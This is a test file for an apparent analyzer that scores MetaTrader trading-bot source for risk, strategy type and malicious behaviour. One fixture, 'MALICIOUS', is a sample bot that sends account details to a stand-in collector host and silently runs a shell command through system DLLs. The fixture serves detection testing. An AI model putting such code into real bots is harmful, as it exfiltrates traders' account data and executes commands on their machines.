import { describe, expect, it } from "vitest";
import { analyzeMq, compiledOnlyAnalysis, compositeScore, fingerprintOf, isNotable, looksCompiled, normalizeSource, stripSource } from "./analyze";

const MARTINGALE_GRID = `//+------------------------------------------------------------------+
//| GoldDigger Grid.mq4                                              |
//+------------------------------------------------------------------+
#property copyright "Copyright 2024, Pip Wizard"
#property link      "https://example.com/pipwizard"
#property version   "2.10"
#property strict

extern double Lots        = 0.01;
extern double LotExponent = 1.6;
extern int    PipStep     = 25;
extern int    TakeProfit  = 15;
extern int    MagicNumber = 777;

double LastLot = 0.01;

int start()
{
   if (OrdersTotal() == 0) {
      OrderSend(Symbol(), OP_BUY, Lots, Ask, 3, 0, Ask + TakeProfit * Point, "grid", MagicNumber, 0, Blue);
      return(0);
   }
   OrderSelect(OrdersTotal() - 1, SELECT_BY_POS, MODE_TRADES);
   if (OrderProfit() < 0 && Ask <= OrderOpenPrice() - PipStep * Point) {
      double lot = NormalizeDouble(OrderLots() * LotExponent, 2);
      OrderSend(Symbol(), OP_BUY, lot, Ask, 3, 0, 0, "grid", MagicNumber, 0, Blue);
   }
   return(0);
}
`;

const CLEAN_TREND = `#property copyright "Example Labs"
#property link      "https://example.org"
#property version   "1.30"
#property description "MA Cross Guarded"
#property strict

input double RiskPercent  = 1.0;
input int    StopLoss     = 300;
input int    TakeProfit   = 600;
input int    FastPeriod   = 20;
input int    SlowPeriod   = 50;
input int    MaxSpread    = 30;
input int    Slippage     = 3;
input double MaxDrawdownPct = 20.0;
input int    MagicNumber  = 20240101;

datetime lastBarTime = 0;

double LotsFor(double slPoints)
{
   double lots = AccountBalance() * RiskPercent / 100.0 / (slPoints * MarketInfo(Symbol(), MODE_TICKVALUE));
   return NormalizeDouble(lots, 2);
}

void OnTick()
{
   if (Time[0] == lastBarTime) return;
   lastBarTime = Time[0];
   if (MarketInfo(Symbol(), MODE_SPREAD) > MaxSpread) return;
   if (AccountEquity() < AccountBalance() * (1.0 - MaxDrawdownPct / 100.0)) return;

   double fast = iMA(NULL, 0, FastPeriod, 0, MODE_EMA, PRICE_CLOSE, 1);
   double slow = iMA(NULL, 0, SlowPeriod, 0, MODE_EMA, PRICE_CLOSE, 1);
   double fastPrev = iMA(NULL, 0, FastPeriod, 0, MODE_EMA, PRICE_CLOSE, 2);
   double slowPrev = iMA(NULL, 0, SlowPeriod, 0, MODE_EMA, PRICE_CLOSE, 2);

   if (OrdersTotal() < 1 && fastPrev < slowPrev && fast > slow) {
      int t = OrderSend(Symbol(), OP_BUY, LotsFor(StopLoss), Ask, Slippage, Ask - StopLoss * Point, Ask + TakeProfit * Point, "ma", MagicNumber, 0, clrGreen);
      if (t < 0) Print("OrderSend failed: ", GetLastError());
   }
}
`;

const MALICIOUS = `#property strict
#import "kernel32.dll"
   int WinExec(string cmd, int show);
#import
#import "shell32.dll"
   int ShellExecuteW(int hwnd, string op, string file, string params, string dir, int show);
#import

string payload = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrL0FCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5Ky9BQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OSsv";

int OnInit()
{
   if (AccountNumber() != 123456) return(INIT_FAILED);
   if (TimeCurrent() > D'2025.06.30') { Alert("Expired"); return(INIT_FAILED); }
   char post[], res[]; string headers;
   string body = "acct=" + IntegerToString(AccountNumber()) + "&server=" + AccountServer();
   StringToCharArray(body, post);
   WebRequest("POST", "https://collector.example.net/x", "", 5000, post, res, headers);
   ShellExecuteW(0, "open", "cmd.exe", "/c whoami", "", 0);
   return(INIT_SUCCEEDED);
}

void OnTick() {
   OrderSend(Symbol(), OP_SELL, 0.1, Bid, 3, Bid + 200 * Point, Bid - 200 * Point, "", 1, 0, Red);
}
`;

const REPAINT = `#property strict
extern int Lots = 1;
void OnTick()
{
   double zz = iCustom(NULL, 0, "ZigZag", 12, 5, 3, 0, 0);
   double rsi = iRSI(NULL, 0, 14, PRICE_CLOSE, 0);
   double peek = Close[-1];
   double fut = iClose(NULL, 0, -1);
   if (zz > 0 && rsi < 30 && peek > Close[1])
      OrderSend(Symbol(), OP_BUY, Lots, Ask, 3, Ask - 100 * Point, Ask + 100 * Point, "", 0, 0, Blue);
}
`;

const MQL5_SCALPER = `#property version "1.00"
#include <Trade\\Trade.mqh>
CTrade trade;
input double Lots = 0.1;
input int TakeProfit = 5;
int hMa;
int OnInit() { hMa = iMA(_Symbol, PERIOD_M1, 10, 0, MODE_SMA, PRICE_CLOSE); return(INIT_SUCCEEDED); }
void OnTick()
{
   double ma[];
   CopyBuffer(hMa, 0, 0, 3, ma);
   MqlTick tick; SymbolInfoTick(_Symbol, tick);
   if (tick.ask > ma[0])
      trade.Buy(Lots, _Symbol, tick.ask, 0, tick.ask + TakeProfit * _Point);
}
`;

describe("stripSource", () => {
  it("blanks comments and string contents but keeps offsets and newlines", () => {
    const src = 'a = "x//y"; // ShellExecute(\n/* WebRequest( */ b = 1;';
    const { code, bare } = stripSource(src);
    expect(code.length).toBe(src.length);
    expect(bare.length).toBe(src.length);
    expect(code).toContain('"x//y"');
    expect(code).not.toContain("ShellExecute");
    expect(code).not.toContain("WebRequest");
    expect(bare).not.toContain("x//y");
    expect(code.split("\n").length).toBe(2);
  });
});

describe("analyzeMq — martingale grid", () => {
  const a = analyzeMq(MARTINGALE_GRID, { fileName: "GoldDigger Grid.mq4" });

  it("detects the families with evidence lines", () => {
    expect(a.language).toBe("mql4");
    expect(a.programKind).toBe("expert");
    expect(a.strategy).toEqual(expect.arrayContaining(["martingale", "grid"]));
    const mart = a.flags.find((f) => f.id === "martingale")!;
    expect(mart.label).toMatch(/after losing/);
    expect(mart.evidence.some((e) => e.line === 10 && e.text.includes("LotExponent"))).toBe(true);
    expect(mart.evidence.some((e) => e.text.includes("OrderLots() * LotExponent"))).toBe(true);
    const grid = a.flags.find((f) => f.id === "grid")!;
    expect(grid.evidence.some((e) => e.text.includes("PipStep"))).toBe(true);
  });

  it("flags the missing stop loss and equity guard as danger", () => {
    expect(a.risk.hasStopLoss).toBe(false);
    expect(a.risk.ordersWithoutStopLoss).toBe(2);
    expect(a.flags.find((f) => f.id === "no-stop-loss")?.severity).toBe("danger");
    expect(a.flags.find((f) => f.id === "no-equity-guard")?.severity).toBe("danger");
    expect(a.flags.find((f) => f.id === "no-max-orders")).toBeTruthy();
    expect(a.risk.lotSizing).toBe("fixed");
    expect(a.risk.hasMagicNumber).toBe(true);
  });

  it("scores it as high risk, never notable", () => {
    expect(a.scores.risk.value).toBeGreaterThanOrEqual(90);
    expect(isNotable(a)).toBe(false);
    expect(compositeScore(a)).toBeLessThanOrEqual(40);
    expect(a.verdict).toMatch(/high risk/);
    expect(a.verdict).toMatch(/profitability unverified/);
    expect(a.verdict).not.toMatch(/profitable(?! ?ity)/);
  });

  it("parses metadata and inputs", () => {
    expect(a.name).toBe("GoldDigger Grid");
    expect(a.version).toBe("2.10");
    expect(a.copyright).toBe("Copyright 2024, Pip Wizard");
    expect(a.link).toBe("https://example.com/pipwizard");
    expect(a.inputs.map((i) => i.name)).toEqual(["Lots", "LotExponent", "PipStep", "TakeProfit", "MagicNumber"]);
    expect(a.inputs[1]).toEqual({ type: "double", name: "LotExponent", default: "1.6" });
  });
});

describe("analyzeMq — clean trend EA", () => {
  const a = analyzeMq(CLEAN_TREND, { fileName: "MACross.mq4" });

  it("sees a guarded trend-follower", () => {
    expect(a.strategy).toContain("trend-following");
    expect(a.strategy).not.toContain("martingale");
    expect(a.strategy).not.toContain("grid");
    expect(a.indicators).toEqual(["iMA"]);
    expect(a.risk).toMatchObject({
      hasStopLoss: true,
      hasTakeProfit: true,
      hasEquityGuard: true,
      hasMaxOrders: true,
      lotSizing: "percent-risk",
      hasSpreadCheck: true,
      hasSlippage: true,
      hasMagicNumber: true,
      hasErrorHandling: true,
      hasNewBarCheck: true,
      usesDll: false,
      networkAccess: false,
    });
    expect(a.flags.filter((f) => f.severity === "danger")).toEqual([]);
    expect(a.flags.find((f) => f.id === "current-bar-signal")).toBeUndefined();
  });

  it("is notable: quality ≥ 70, risk ≤ 40, no danger", () => {
    expect(a.scores.quality.value).toBeGreaterThanOrEqual(70);
    expect(a.scores.risk.value).toBeLessThanOrEqual(40);
    expect(isNotable(a)).toBe(true);
    expect(compositeScore(a)).toBeGreaterThan(70);
    expect(a.description).toBe("MA Cross Guarded");
    expect(a.version).toBe("1.30");
  });

  it("explains every score: the why lines add up to the value", () => {
    for (const s of Object.values(a.scores)) {
      const sum = s.why.reduce((acc, w) => acc + Number(w.split(" ")[0]), 0);
      expect(Math.max(0, Math.min(100, sum))).toBe(s.value);
    }
  });
});

describe("analyzeMq — malicious", () => {
  const a = analyzeMq(MALICIOUS, { fileName: "free_profit_bot.mq4" });
  const ids = a.flags.map((f) => f.id);

  it("flags system DLLs, shell, exfiltration, locks, expiry, obfuscation", () => {
    expect(ids).toEqual(
      expect.arrayContaining(["dll-system", "shell-exec", "web-request", "account-lock", "expiry", "obfuscation"]),
    );
    expect(a.flags.find((f) => f.id === "dll-system")!.label).toMatch(/kernel32\.dll, shell32\.dll/);
    expect(a.flags.find((f) => f.id === "dll-system")!.evidence.map((e) => e.line)).toEqual([2, 5]);
    expect(a.flags.find((f) => f.id === "web-request")!.severity).toBe("danger");
    expect(a.risk).toMatchObject({ usesDll: true, networkAccess: true, accountLock: true, timeBomb: true, obfuscated: true });
    expect(isNotable(a)).toBe(false);
    expect(a.scores.risk.value).toBeGreaterThanOrEqual(45);
  });

  it("does not flag words that only appear in comments or strings", () => {
    const b = analyzeMq(`// ShellExecute( WebRequest( #import "kernel32.dll"\nstring s = "LotExponent ShellExecute(";\nvoid OnTick(){ OrderSend(Symbol(),OP_BUY,0.1,Ask,3,Ask-50*Point,Ask+50*Point,"",1,0,Blue); }`);
    const bid = b.flags.map((f) => f.id);
    expect(bid).not.toContain("shell-exec");
    expect(bid).not.toContain("web-request");
    expect(bid).not.toContain("dll-system");
    expect(b.strategy).not.toContain("martingale");
  });
});

describe("analyzeMq — repainting and look-ahead", () => {
  const a = analyzeMq(REPAINT, { fileName: "zz.mq4" });
  it("catches ZigZag, iCustom shift 0, current-bar signals and future bars", () => {
    const by = Object.fromEntries(a.flags.map((f) => [f.id, f]));
    expect(by["zigzag"]?.severity).toBe("warn");
    expect(by["icustom-current-bar"]?.evidence[0].line).toBe(5);
    expect(by["current-bar-signal"]?.severity).toBe("warn");
    expect(by["future-leak"]?.severity).toBe("danger");
    expect(by["future-leak"].evidence.map((e) => e.line)).toEqual([7, 8]);
    expect(a.risk.hasNewBarCheck).toBe(false);
    expect(a.scores.reliability.value).toBeLessThan(30);
  });
});

describe("analyzeMq — MQL5", () => {
  const a = analyzeMq(MQL5_SCALPER);
  it("detects MQL5, CTrade orders without SL, CopyBuffer on bar 0, scalping", () => {
    expect(a.language).toBe("mql5");
    expect(a.risk.orderCalls).toBe(1);
    expect(a.risk.hasStopLoss).toBe(false);
    expect(a.flags.find((f) => f.id === "no-stop-loss")?.evidence[0].text).toContain("trade.Buy");
    expect(a.flags.find((f) => f.id === "current-bar-signal")?.evidence[0].text).toContain("CopyBuffer");
    expect(a.strategy).toContain("scalping");
    expect(a.flags.find((f) => f.id === "no-spread-check")).toBeTruthy();
  });
});

describe("fingerprint", () => {
  it("ignores comments and whitespace, changes with code", () => {
    const reformatted = MARTINGALE_GRID.replace(/^\/\/[^\n]*/gm, "// changed comment").replace(/ {3}/g, "\t").replace(/\n/g, "\r\n\n");
    expect(fingerprintOf(reformatted)).toBe(fingerprintOf(MARTINGALE_GRID));
    expect(fingerprintOf(MARTINGALE_GRID.replace("1.6", "1.7"))).not.toBe(fingerprintOf(MARTINGALE_GRID));
    expect(normalizeSource("int a = 1; // x\n/* y */ int b;")).toBe("inta=1;intb;");
    expect(analyzeMq(MARTINGALE_GRID).fingerprint).toMatch(/^[0-9a-f]{64}$/);
  });

  it("lineage links two versions of one bot", () => {
    const v1 = analyzeMq(MARTINGALE_GRID, { fileName: "GoldDigger Grid v2.mq4" });
    const v2 = analyzeMq(MARTINGALE_GRID.replace("1.6", "1.8"), { fileName: "GoldDigger Grid v3.mq4" });
    expect(v1.fingerprint).not.toBe(v2.fingerprint);
    expect(v1.lineage).toBe(v2.lineage);
  });

  it("is deterministic", () => {
    expect(analyzeMq(CLEAN_TREND)).toEqual(analyzeMq(CLEAN_TREND));
  });
});

describe("compiled files", () => {
  it("never analyses .ex4 and marks it unverifiable", () => {
    const a = analyzeMq("anything", { fileName: "Robot.ex4" });
    expect(a.language).toBe("compiled");
    expect(a.flags[0]).toMatchObject({ id: "compiled-only", severity: "danger" });
    expect(isNotable(a)).toBe(false);
    expect(compiledOnlyAnalysis("X.ex5").name).toBe("X");
  });
  it("recognises binary text handed over as source", () => {
    expect(looksCompiled("EX-4\u0000\u0001\u0002binary")).toBe(true);
    expect(looksCompiled(CLEAN_TREND)).toBe(false);
    expect(analyzeMq("\u0000\u0001\u0002\u0003").language).toBe("compiled");
  });
});

describe("other detections", () => {
  it("finds hedging, averaging, news/time filters, tester detection, decompiled names", () => {
    const decompNames = Array.from({ length: 16 }, (_, i) => `double gd_${100 + i * 8} = 0;`).join("\n");
    const src = `${decompNames}
extern bool UseNewsFilter = true;
extern int StartHour = 8;
void OnTick() {
  if (IsTesting()) return;
  if (Hour() < StartHour) return;
  double avgPrice = 0; double total = 0;
  for (int i = 0; i < OrdersTotal(); i++) { OrderSelect(i, SELECT_BY_POS); avgPrice += OrderOpenPrice() * OrderLots(); }
  bool Hedge = true;
  OrderSend(Symbol(), OP_SELL, 0.1, Bid, 3, Bid + 100*Point, 0, "", 0, 0, Red);
}`;
    const a = analyzeMq(src);
    expect(a.strategy).toEqual(expect.arrayContaining(["averaging", "hedging", "news-filter", "time-filter"]));
    expect(a.risk.testerDetection).toBe(true);
    expect(a.risk.decompiled).toBe(true);
    expect(a.flags.find((f) => f.id === "decompiled")?.severity).toBe("warn");
  });

  it("an indicator with no orders is called out, not scored as a trading system", () => {
    const a = analyzeMq(`#property indicator_chart_window\nint OnCalculate(const int rates_total){ return rates_total; }`);
    expect(a.programKind).toBe("indicator");
    expect(a.flags.find((f) => f.id === "not-an-ea")).toBeTruthy();
    expect(a.strategy).toEqual(["unclassified"]);
  });

  it("stop loss set later via OrderModify counts", () => {
    const a = analyzeMq(`void OnTick(){ int t = OrderSend(Symbol(),OP_BUY,0.1,Ask,3,0,0,"",1,0,Blue);
  if (OrderSelect(t, SELECT_BY_TICKET)) OrderModify(t, OrderOpenPrice(), Ask - 100*Point, Ask + 100*Point, 0, Blue); }`);
    expect(a.risk.hasStopLoss).toBe(true);
    expect(a.flags.find((f) => f.id === "no-stop-loss")).toBeUndefined();
  });

  it("an optional stop loss that defaults to 0 is a warning", () => {
    const a = analyzeMq(`input int StopLoss = 0;\nvoid OnTick(){ OrderSend(Symbol(),OP_BUY,0.1,Ask,3,StopLoss>0?Ask-StopLoss*Point:0,0,"",1,0,Blue); }`);
    expect(a.risk.stopLossDefaultOff).toBe(true);
    expect(a.flags.find((f) => f.id === "stop-loss-off-by-default")?.evidence[0].line).toBe(1);
  });
});

describe("isNotable — boilerplate never interrupts the owner", () => {
  const good = analyzeMq(CLEAN_TREND, { fileName: "MACross.mq4" });
  it.each(["MACD Sample", "EA_Template", "TradeCopySlave", "MtApi", "MyfirstRobot", "Hello World EA"])("%s is not notable", (name) => {
    expect(isNotable({ ...good, name, fileName: `${name}.mq4` })).toBe(false);
  });
  it("a strategy with no real family is not notable", () => {
    expect(isNotable({ ...good, strategy: ["unclassified", "time-filter"] })).toBe(false);
  });
  it("an EA without a stop loss is not notable", () => {
    expect(isNotable({ ...good, risk: { ...good.risk, hasStopLoss: false } })).toBe(false);
  });
});
